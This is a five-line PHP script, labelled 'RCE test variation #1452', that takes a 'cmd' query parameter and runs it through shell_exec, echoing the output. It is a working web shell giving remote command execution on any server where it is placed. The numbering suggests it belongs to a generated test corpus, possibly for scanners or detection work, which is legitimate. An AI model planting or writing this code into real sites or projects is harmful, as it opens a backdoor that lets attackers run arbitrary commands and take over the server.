<?php
// RCE test variation #1452
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>